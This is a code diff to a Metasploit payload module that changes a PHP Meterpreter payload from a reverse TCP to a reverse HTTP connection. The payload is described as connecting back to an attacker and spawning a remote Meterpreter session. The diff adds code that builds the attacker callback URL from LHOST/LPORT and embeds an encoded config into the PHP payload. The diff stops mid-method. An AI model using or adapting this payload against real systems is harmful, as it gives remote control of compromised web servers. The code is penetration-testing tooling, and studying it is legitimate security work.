@@ -7,22 +7,22 @@ module MetasploitModule
   CachedSize = :dynamic
 
   include Msf::Payload::Single
-  include Msf::Payload::Php::ReverseTcp
+  include Msf::Payload::Php::ReverseHttp
   include Msf::Payload::TransportConfig
   include Msf::Payload::UUID::Options
-  include Msf::Sessions::MeterpreterOptions::Php
+  include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
     super(
-      update_info(
+      merge_info(
         info,
-        'Name' => 'PHP Meterpreter, Reverse TCP Inline',
-        'Description' => 'Connect back to attacker and spawn a Meterpreter server (PHP)',
-        'Author' => ['egypt'],
+        'Name' => 'PHP Meterpreter, Reverse HTTP Inline',
+        'Description' => 'Connect back to attacker and spawn a Meterpreter server via HTTP (PHP)',
+        'Author' => 'OJ Reeves',
+        'License' => MSF_LICENSE,
         'Platform' => 'php',
         'Arch' => ARCH_PHP,
-        'License' => MSF_LICENSE,
-        'Handler' => Msf::Handler::ReverseTcp,
+        'Handler' => Msf::Handler::ReverseHttp,
         'Session' => Msf::Sessions::Meterpreter_Php_Php
       )
     )
@@ -32,25 +32,39 @@ module MetasploitModule
     ds = opts[:datastore] || datastore
     opts[:uuid] ||= generate_payload_uuid
 
-    opts[:transport_config] ||= [transport_config_reverse_tcp(opts)]
+    opts[:transport_config] ||= [transport_config_reverse_http(opts)]
 
     config_opts = {
-      ascii_str:         true,
+      ascii_str: true,
       null_session_guid: true,
-      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
-      uuid:              opts[:uuid],
-      transports:        opts[:transport_config],
-      stageless:         true,
+      expiration: (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
+      uuid: opts[:uuid],
+      transports: opts[:transport_config],
+      stageless: true,
     }.merge(meterpreter_logging_config(opts))
 
     config = Rex::Payloads::Meterpreter::Config.new(config_opts)
     config.to_b
   end
 
-  def generate(_opts = {})
+  def generate_reverse_http(opts = {})
+    opts[:uri_uuid_mode] = :init_connect
+
+    ds = opts[:datastore] || datastore
+    opts.merge!({
+      host: ds['LHOST'] || '127.127.127.127',
+      port: ds['LPORT']
+    })
+    opts[:scheme] = 'http' if opts[:scheme].nil?
+    url = generate_callback_url(opts)
+
     met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
 
-    config_block = Rex::Text.encode_base64(generate_config(_opts))
+    config_block = Rex::Text.encode_base64(generate_config(
+      url: url,
+      scheme: opts[:scheme],
+      stageless: true
+    ))
     met = met.sub('"CONFIG_BLOCK", ""', "\"CONFIG_BLOCK\", \"#{config_block}\"")
 
     if datastore['MeterpreterDebugBuild']
